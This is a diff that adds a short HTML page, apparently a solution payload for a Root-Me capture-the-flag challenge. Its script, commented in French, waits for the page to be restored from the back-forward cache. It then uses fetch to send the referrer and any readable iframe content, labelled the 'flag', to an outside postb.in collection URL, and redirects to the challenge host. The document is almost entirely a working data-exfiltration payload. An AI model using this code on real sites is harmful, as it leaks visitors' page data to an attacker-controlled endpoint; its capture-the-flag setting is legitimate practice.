@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Cache-Control" content="max-age=3600">
+</head>
+<body>
+<script>
+  const EXFIL = "https://www.postb.in/1778660481006-3008019395638";
+
+  window.onpageshow = function(event) {
+    if (event.persisted) {
+      // Page restaurée depuis bfcache — on exfiltre
+      fetch(EXFIL + "?data=" + encodeURIComponent(document.referrer));
+
+      // Tente de lire le DOM si une iframe a été chargée
+      try {
+        const content = document.getElementById("f").contentDocument.body.innerHTML;
+        fetch(EXFIL + "?flag=" + encodeURIComponent(content));
+      } catch(e) {
+        fetch(EXFIL + "?err=" + encodeURIComponent(e.toString()));
+      }
+    }
+  };
+
+  window.location = "http://challenge01.root-me.org:58007/flag";
+</script>
+</body>
+</html>
